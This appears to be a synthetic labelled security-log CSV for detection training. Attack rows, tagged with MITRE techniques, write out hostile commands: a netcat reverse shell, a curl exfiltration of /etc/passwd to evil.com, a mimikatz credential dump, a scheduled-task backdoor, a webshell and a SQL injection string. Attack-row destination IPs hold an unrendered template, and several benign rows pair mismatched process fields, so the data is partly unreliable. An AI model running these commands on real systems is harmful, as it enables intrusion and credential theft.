@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-10T11:43:44.565744,benign,,,,process,success,192.168.1.14,8443,10.0.5.47,3306,3360,32,web4,linux,david.moore,8757,explorer.exe,explorer.exe,,
2026-09-14T09:32:15.546521,attack,persistence,T1053,persistence,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,194,4,workstation1,windows,test,844,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-09T16:05:54.557234,benign,,,,authentication,success,192.168.1.214,8443,10.0.5.186,3306,677,20,web100,linux,admin,5236,apache2,chrome.exe --profile-directory=Default,,
2026-09-13T16:16:57.558343,benign,,,,network,success,192.168.1.85,2048,10.0.4.62,3306,4258,33,backup1,linux,david.moore,4698,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-12T17:00:08.555440,benign,,,,authentication,success,192.168.1.94,4096,10.0.4.190,53,798,58,app10,linux,jane.smith,1305,nginx,firefox.exe,,
2026-09-15T07:42:17.561452,benign,,,,authentication,success,192.168.1.239,2048,10.0.4.241,3306,4587,45,db4,windows,chris.miller,731,apache2,firefox.exe,,
2026-09-14T23:05:04.544006,attack,reverse_shell,T1059,execution,process,success,192.168.56.8,46184,"10.0.0.{random.randint(1, 254)}",4444,3677,35,mail2,linux,test,7780,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T16:38:38.557365,benign,,,,network,success,192.168.1.115,4096,10.0.5.156,22,2345,26,mail100,linux,chris.miller,7311,firefox.exe,explorer.exe,,
2026-09-15T12:40:12.560700,benign,,,,network,success,192.168.1.227,5000,10.0.5.83,443,8779,46,mail100,windows,admin,1359,firefox.exe,apache2 -DFOREGROUND,,
2026-09-12T16:40:25.544288,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.6,36655,"10.0.0.{random.randint(1, 254)}",443,7494,19,db50,windows,root,5760,powershell.exe,,,evil-c2.com
2026-09-12T13:49:22.542552,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.8,45510,"10.0.0.{random.randint(1, 254)}",445,19755,420,db2,linux,admin,5590,psexec.exe,,,
2026-09-13T09:51:16.559469,benign,,,,authentication,success,192.168.1.173,3072,10.0.2.19,22,3304,25,srv4,linux,lisa.wilson,9033,nginx,chrome.exe --profile-directory=Default,,
2026-09-08T17:40:41.548727,benign,,,,network,success,192.168.1.141,1024,10.0.2.50,443,7872,83,web2,linux,emily.davis,1558,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T15:02:49.544926,attack,webshell,T1505,persistence,file,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,9447,2,srv4,windows,guest,4586,php,php /var/www/html/shell.php,shell.php,
2026-09-12T23:48:22.560210,benign,,,,file,success,192.168.1.85,3072,10.0.3.21,53,7416,23,app4,windows,sarah.jones,4855,firefox.exe,explorer.exe,,
2026-09-09T23:11:43.565111,benign,,,,network,success,192.168.1.116,1024,10.0.2.225,22,3031,84,app1,windows,jane.smith,7407,apache2,firefox.exe,,
2026-09-13T13:32:51.543693,attack,port_scan,T1046,discovery,network,success,192.168.56.8,12158,"10.0.0.{random.randint(1, 254)}",3306,3567,14,db20,windows,guest,1546,cmd.exe,,,
2026-09-12T06:26:46.540898,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.8,6093,"10.0.0.{random.randint(1, 254)}",22,1012,11,mail5,windows,root,6443,cmd.exe,,,
2026-09-13T19:54:00.542578,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,7693,2,web3,windows,test,6243,php,php /var/www/html/shell.php,shell.php,
2026-09-11T04:15:58.558988,benign,,,,file,success,192.168.1.39,3072,10.0.0.128,53,3863,80,srv20,windows,sarah.jones,3591,systemd,firefox.exe,,
2026-09-13T03:28:47.549424,benign,,,,network,success,192.168.1.35,4096,10.0.1.37,53,468,73,app3,linux,john.doe,8176,explorer.exe,firefox.exe,,
2026-09-14T04:39:02.571141,benign,,,,network,success,192.168.1.101,3072,10.0.5.130,3306,8508,39,app1,linux,chris.miller,2142,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T23:18:19.566395,benign,,,,network,success,192.168.1.12,8443,10.0.0.201,53,9338,98,db1,linux,admin,1484,nginx,explorer.exe,,
2026-09-12T22:11:08.557909,benign,,,,network,success,192.168.1.219,4096,10.0.1.152,3306,5124,85,app100,linux,sarah.jones,5389,apache2,apache2 -DFOREGROUND,,
2026-09-09T19:12:29.569375,benign,,,,network,success,192.168.1.25,1024,10.0.0.101,22,8175,36,app4,windows,sarah.jones,8493,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T10:39:40.552453,benign,,,,network,success,192.168.1.26,4096,10.0.4.193,80,7306,27,app5,linux,sarah.jones,8136,systemd,chrome.exe --profile-directory=Default,,
2026-09-14T15:28:10.544481,attack,reverse_shell,T1059,execution,process,success,192.168.56.6,38010,"10.0.0.{random.randint(1, 254)}",4444,2378,32,mail10,windows,admin,3217,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T05:52:15.555770,benign,,,,network,success,192.168.1.158,5000,10.0.4.104,53,3184,81,web10,windows,lisa.wilson,8193,firefox.exe,apache2 -DFOREGROUND,,
2026-09-15T10:08:41.565081,benign,,,,network,success,192.168.1.133,4096,10.0.2.81,3306,5812,4,mail20,windows,lisa.wilson,5995,nginx,chrome.exe --profile-directory=Default,,
2026-09-13T17:20:10.560850,benign,,,,authentication,success,192.168.1.142,1024,10.0.4.11,53,4644,68,app1,windows,john.doe,2084,sshd,firefox.exe,,
2026-09-10T14:39:08.565921,benign,,,,process,success,192.168.1.235,2048,10.0.2.30,22,5207,89,backup20,linux,john.doe,5639,apache2,explorer.exe,,
2026-09-14T17:19:37.555072,benign,,,,file,success,192.168.1.36,4096,10.0.3.167,80,6329,4,db4,linux,admin,7444,explorer.exe,explorer.exe,,
2026-09-08T17:38:05.567580,benign,,,,network,success,192.168.1.167,8443,10.0.4.243,53,1639,28,mail5,windows,chris.miller,5454,firefox.exe,explorer.exe,,
2026-09-12T17:18:32.546217,attack,persistence,T1053,persistence,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,773,8,mail1,linux,administrator,1548,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-15T03:39:35.564743,benign,,,,authentication,success,192.168.1.194,2048,10.0.0.115,22,1584,26,srv100,linux,mark.wilson,1361,nginx,firefox.exe,,
2026-09-15T08:06:54.561657,benign,,,,process,success,192.168.1.77,3072,10.0.2.37,3306,524,16,srv50,linux,mike.brown,3400,apache2,apache2 -DFOREGROUND,,
2026-09-13T13:59:16.556933,benign,,,,network,success,192.168.1.237,8443,10.0.3.158,80,2978,79,web20,windows,chris.miller,1545,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-14T12:34:59.565266,benign,,,,network,success,192.168.1.71,1024,10.0.4.91,3306,9666,57,db4,windows,mike.brown,5804,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T02:31:34.549058,benign,,,,authentication,success,192.168.1.55,5000,10.0.3.198,443,2429,18,srv1,windows,lisa.wilson,2629,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-08T17:29:15.554973,benign,,,,network,success,192.168.1.85,3072,10.0.1.36,443,5282,71,app4,windows,mike.brown,7033,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-11T12:48:41.563406,benign,,,,network,success,192.168.1.1,3072,10.0.2.87,22,1042,29,srv4,windows,sarah.jones,617,firefox.exe,firefox.exe,,
2026-09-12T10:45:11.569161,benign,,,,network,success,192.168.1.83,2048,10.0.5.17,443,7870,50,db10,windows,mike.brown,1542,apache2,explorer.exe,,
2026-09-11T03:12:48.549823,benign,,,,process,success,192.168.1.209,1024,10.0.5.246,443,7600,80,mail4,windows,mike.brown,2199,firefox.exe,explorer.exe,,
2026-09-09T14:40:25.545065,attack,persistence,T1053,persistence,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,443,10,app1,linux,administrator,6284,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-11T04:10:36.561959,benign,,,,network,success,192.168.1.143,4096,10.0.5.180,53,503,97,backup50,linux,mike.brown,8875,explorer.exe,explorer.exe,,
2026-09-09T06:19:51.545301,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.8,35412,"10.0.0.{random.randint(1, 254)}",53,55547,413,backup3,windows,root,1879,bash,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-14T03:32:23.568874,benign,,,,file,success,192.168.1.228,3072,10.0.5.116,80,8260,79,db50,windows,lisa.wilson,5741,nginx,firefox.exe,,
2026-09-10T09:14:32.542130,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.5,11169,"10.0.0.{random.randint(1, 254)}",445,48210,390,srv5,linux,admin,7342,psexec.exe,,,
2026-09-12T02:32:08.557564,benign,,,,network,success,192.168.1.95,1024,10.0.1.161,443,876,40,web2,windows,john.doe,8096,apache2,chrome.exe --profile-directory=Default,,
2026-09-12T00:18:04.559106,benign,,,,network,success,192.168.1.61,1024,10.0.3.52,443,1693,93,srv2,linux,emily.davis,5809,explorer.exe,firefox.exe,,
2026-09-13T20:57:56.547745,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.1,14942,"10.0.0.{random.randint(1, 254)}",443,151,32,web1,windows,test,8933,python3,,,evil-c2.com
2026-09-09T05:58:17.545950,attack,port_scan,T1046,discovery,network,success,192.168.56.6,46027,"10.0.0.{random.randint(1, 254)}",22,1379,6,db1,linux,admin,5379,powershell.exe,,,
2026-09-11T17:47:21.557420,benign,,,,network,success,192.168.1.65,8443,10.0.5.17,80,9616,1,backup5,windows,david.moore,1985,sshd,firefox.exe,,
2026-09-15T07:02:58.549466,benign,,,,network,success,192.168.1.218,8443,10.0.4.9,53,4304,67,app100,windows,lisa.wilson,8356,sshd,explorer.exe,,
2026-09-13T23:05:04.555341,benign,,,,network,success,192.168.1.76,5000,10.0.2.209,22,2727,8,srv20,linux,sarah.jones,4600,apache2,firefox.exe,,
2026-09-10T01:07:47.563306,benign,,,,authentication,success,192.168.1.221,2048,10.0.0.45,443,307,39,app20,linux,david.moore,9097,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-15T02:30:48.560113,benign,,,,process,success,192.168.1.220,1024,10.0.1.38,22,2425,69,db5,windows,jane.smith,6542,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T15:08:33.569131,benign,,,,process,success,192.168.1.67,5000,10.0.0.231,3306,5424,72,web50,linux,john.doe,957,chrome.exe,explorer.exe,,
2026-09-14T13:18:13.552384,benign,,,,authentication,success,192.168.1.79,4096,10.0.0.90,443,8159,57,mail10,linux,jane.smith,3441,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-15T07:41:11.568017,benign,,,,authentication,success,192.168.1.246,3072,10.0.3.95,22,8398,4,db5,linux,admin,3016,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T22:02:53.570721,benign,,,,authentication,success,192.168.1.201,4096,10.0.4.146,80,2724,91,app20,linux,admin,7123,chrome.exe,explorer.exe,,
2026-09-11T21:12:40.549491,benign,,,,process,success,192.168.1.196,3072,10.0.0.146,3306,389,11,backup4,linux,sarah.jones,9106,sshd,apache2 -DFOREGROUND,,
2026-09-12T10:05:47.555280,benign,,,,network,success,192.168.1.178,5000,10.0.3.128,22,5129,33,app50,linux,mike.brown,9116,firefox.exe,apache2 -DFOREGROUND,,
2026-09-13T08:53:04.553919,benign,,,,authentication,success,192.168.1.65,8443,10.0.1.73,80,6645,82,srv100,windows,mike.brown,5467,sshd,firefox.exe,,
2026-09-13T14:07:16.558295,benign,,,,network,success,192.168.1.36,4096,10.0.3.200,53,7272,29,web3,windows,david.moore,5007,nginx,explorer.exe,,
2026-09-12T15:43:39.569784,benign,,,,process,success,192.168.1.74,5000,10.0.5.90,53,3230,18,db20,linux,mark.wilson,9697,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T16:45:58.558922,benign,,,,network,success,192.168.1.50,8443,10.0.5.205,443,3020,53,web10,linux,emily.davis,3794,systemd,chrome.exe --profile-directory=Default,,
2026-09-14T08:07:03.552849,benign,,,,authentication,success,192.168.1.209,5000,10.0.4.87,3306,7272,68,web100,linux,admin,8982,systemd,firefox.exe,,
2026-09-13T12:40:08.559286,benign,,,,network,success,192.168.1.124,5000,10.0.4.114,443,9245,73,srv4,linux,lisa.wilson,7281,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-11T04:43:52.569729,benign,,,,network,success,192.168.1.99,3072,10.0.3.146,53,2131,69,db5,windows,mike.brown,3210,systemd,explorer.exe,,
2026-09-15T06:10:54.565539,benign,,,,network,success,192.168.1.45,5000,10.0.2.75,80,4289,27,mail10,linux,lisa.wilson,4559,chrome.exe,explorer.exe,,
2026-09-10T13:20:52.560748,benign,,,,network,success,192.168.1.165,3072,10.0.1.205,22,9299,35,db10,linux,mike.brown,1066,explorer.exe,firefox.exe,,
2026-09-09T01:49:17.556974,benign,,,,network,success,192.168.1.212,3072,10.0.2.114,443,1186,15,db3,linux,david.moore,9314,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-09T17:13:09.561706,benign,,,,file,success,192.168.1.87,3072,10.0.0.118,22,1898,88,mail2,windows,john.doe,550,apache2,firefox.exe,,
2026-09-13T08:47:33.549773,benign,,,,network,success,192.168.1.136,2048,10.0.5.95,80,8262,38,workstation50,linux,mike.brown,3419,nginx,firefox.exe,,
2026-09-11T11:31:18.566779,benign,,,,authentication,success,192.168.1.150,4096,10.0.2.227,443,3243,9,srv2,linux,jane.smith,6945,chrome.exe,explorer.exe,,
2026-09-13T23:14:42.559475,benign,,,,authentication,success,192.168.1.200,2048,10.0.4.134,53,2689,98,srv20,windows,lisa.wilson,3584,chrome.exe,firefox.exe,,
2026-09-12T16:52:03.554148,benign,,,,authentication,success,192.168.1.199,3072,10.0.2.39,53,4721,53,app5,linux,admin,1107,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T20:27:49.543501,attack,sql_injection,T1190,initial_access,web,success,192.168.56.10,29154,"10.0.0.{random.randint(1, 254)}",80,1337,6,srv2,windows,test,2112,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-14T09:19:29.548421,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,53638,"10.0.0.{random.randint(1, 254)}",443,584,88,app1,linux,admin,1762,python3,,,evil-c2.com
2026-09-14T22:37:16.565690,benign,,,,network,success,192.168.1.182,3072,10.0.1.195,443,3933,77,workstation20,linux,john.doe,5765,chrome.exe,firefox.exe,,
2026-09-12T14:11:39.560670,benign,,,,process,success,192.168.1.31,4096,10.0.0.118,3306,5214,23,web10,windows,mark.wilson,4019,explorer.exe,apache2 -DFOREGROUND,,
2026-09-09T17:06:06.568813,benign,,,,authentication,success,192.168.1.236,3072,10.0.0.141,80,5984,52,mail2,windows,jane.smith,4910,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T23:28:04.562913,benign,,,,network,success,192.168.1.130,3072,10.0.2.12,3306,6638,36,srv3,linux,admin,3040,apache2,firefox.exe,,
2026-09-10T00:30:23.543387,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,49930,"10.0.0.{random.randint(1, 254)}",445,32995,197,db5,windows,admin,2664,psexec.exe,,,
2026-09-11T07:33:08.557624,benign,,,,network,success,192.168.1.131,8443,10.0.3.65,53,4132,41,db3,linux,mark.wilson,4415,sshd,firefox.exe,,
2026-09-12T05:49:59.543135,attack,port_scan,T1046,discovery,network,success,192.168.56.6,54165,"10.0.0.{random.randint(1, 254)}",3389,914,20,srv100,linux,admin,2148,bash,,,
2026-09-13T05:30:19.546295,attack,reverse_shell,T1059,execution,process,success,192.168.56.3,2319,"10.0.0.{random.randint(1, 254)}",4444,4402,2,mail20,windows,administrator,5890,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-11T21:23:20.549676,benign,,,,network,success,192.168.1.219,8443,10.0.5.213,80,1414,54,workstation4,windows,lisa.wilson,558,systemd,explorer.exe,,
2026-09-08T23:49:17.545931,attack,persistence,T1053,persistence,process,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,808,7,app3,linux,test,4552,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-14T16:53:14.551547,benign,,,,network,success,192.168.1.85,2048,10.0.3.160,53,9089,30,mail100,windows,sarah.jones,7582,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T19:51:21.546671,attack,port_scan,T1046,discovery,network,success,192.168.56.3,12394,"10.0.0.{random.randint(1, 254)}",3389,2223,35,mail3,linux,test,8923,python3,,,
2026-09-10T21:52:01.557558,benign,,,,network,success,192.168.1.206,4096,10.0.5.232,3306,7706,34,mail50,linux,emily.davis,6903,apache2,chrome.exe --profile-directory=Default,,
2026-09-15T03:30:05.540910,attack,reverse_shell,T1059,execution,process,success,192.168.56.8,56622,"10.0.0.{random.randint(1, 254)}",4444,4022,42,app2,linux,guest,1420,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T22:55:20.544409,attack,persistence,T1053,persistence,process,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,190,7,mail10,windows,root,2167,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-08T18:51:32.570255,benign,,,,network,success,192.168.1.82,8443,10.0.5.196,53,3922,66,app5,windows,mike.brown,6281,explorer.exe,explorer.exe,,
2026-09-15T01:05:51.562934,benign,,,,process,success,192.168.1.60,2048,10.0.4.19,53,3043,54,workstation100,linux,mike.brown,3942,explorer.exe,apache2 -DFOREGROUND,,
2026-09-11T20:44:26.544954,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,38569,"10.0.0.{random.randint(1, 254)}",443,3000,60,backup5,linux,administrator,848,python3,,,evil-c2.com
2026-09-10T00:25:15.540925,attack,reverse_shell,T1059,execution,process,success,192.168.56.2,11289,"10.0.0.{random.randint(1, 254)}",4444,4400,23,workstation4,linux,root,3623,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T18:13:21.570542,benign,,,,network,success,192.168.1.68,1024,10.0.4.118,53,5291,70,db20,linux,sarah.jones,5568,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T19:33:24.569832,benign,,,,process,success,192.168.1.198,4096,10.0.0.204,22,2832,86,db50,linux,jane.smith,9535,systemd,firefox.exe,,
2026-09-11T10:48:42.543795,attack,reverse_shell,T1059,execution,process,success,192.168.56.8,61361,"10.0.0.{random.randint(1, 254)}",4444,2351,20,app2,linux,administrator,7812,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T07:24:05.568102,benign,,,,network,success,192.168.1.250,3072,10.0.5.140,53,9803,14,web3,linux,john.doe,7744,firefox.exe,explorer.exe,,
2026-09-12T17:25:42.567481,benign,,,,network,success,192.168.1.8,2048,10.0.5.158,3306,7131,29,backup2,linux,jane.smith,4420,systemd,explorer.exe,,
2026-09-10T09:26:53.566129,benign,,,,network,success,192.168.1.209,4096,10.0.4.32,3306,5692,86,app3,linux,mark.wilson,3355,firefox.exe,firefox.exe,,
2026-09-10T17:05:08.545822,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.4,45818,"10.0.0.{random.randint(1, 254)}",445,8710,126,app4,linux,root,5067,psexec.exe,,,
2026-09-10T13:10:49.545201,attack,credential_dump,T1003,credential_access,process,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,9840,8,mail2,windows,administrator,5225,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-09T11:07:18.540287,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.10,40286,"10.0.0.{random.randint(1, 254)}",22,1550,5,db100,linux,guest,6394,powershell.exe,,,
2026-09-11T22:58:54.558875,benign,,,,process,success,192.168.1.5,1024,10.0.3.138,443,9903,44,srv100,linux,lisa.wilson,898,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T19:42:50.559322,benign,,,,process,success,192.168.1.127,2048,10.0.1.226,80,5602,7,web3,windows,sarah.jones,3840,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T01:31:22.556459,benign,,,,process,success,192.168.1.34,8443,10.0.2.49,80,2744,12,db2,windows,mark.wilson,2105,explorer.exe,firefox.exe,,
2026-09-10T14:22:16.555352,benign,,,,network,success,192.168.1.171,3072,10.0.1.35,22,8511,9,web20,windows,emily.davis,8930,chrome.exe,explorer.exe,,
2026-09-10T08:30:15.564169,benign,,,,network,success,192.168.1.161,3072,10.0.1.93,53,5424,53,web20,linux,mark.wilson,1049,sshd,firefox.exe,,
2026-09-09T02:58:17.550007,benign,,,,network,success,192.168.1.11,2048,10.0.0.134,22,9846,2,db50,windows,jane.smith,7850,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-11T02:14:52.546660,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.5,24734,"10.0.0.{random.randint(1, 254)}",445,5847,175,web10,windows,admin,4456,psexec.exe,,,
2026-09-14T11:34:10.560175,benign,,,,network,success,192.168.1.153,3072,10.0.5.13,53,6112,17,srv50,windows,jane.smith,2819,apache2,chrome.exe --profile-directory=Default,,
